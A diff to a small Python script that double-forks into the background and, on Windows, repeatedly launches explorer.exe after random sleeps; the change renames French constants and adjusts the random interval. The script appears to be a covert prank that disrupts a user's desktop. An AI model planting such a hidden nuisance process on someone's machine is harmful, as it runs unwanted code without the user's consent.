@@ -10,9 +10,9 @@ from subprocess import call
 from sys        import exit
 from time       import sleep
 
-HEURE       = 3600
-DEMI_HEURE  = 1800
-MINUTE      = 60
+HOUR       = 3600
+HALF       = 1800
+MINUTE     = 60
 
 if __name__ == "__main__":
     pid = fork()
@@ -21,7 +21,7 @@ if __name__ == "__main__":
         pid = fork()
         if pid==0:
             while True:
-                rand = randint(MINUTE)
+                rand = randint(0,HALF)
                 sleep(rand)
                 if currentOS == 'nt':
                     system("start %windir%\explorer.exe")
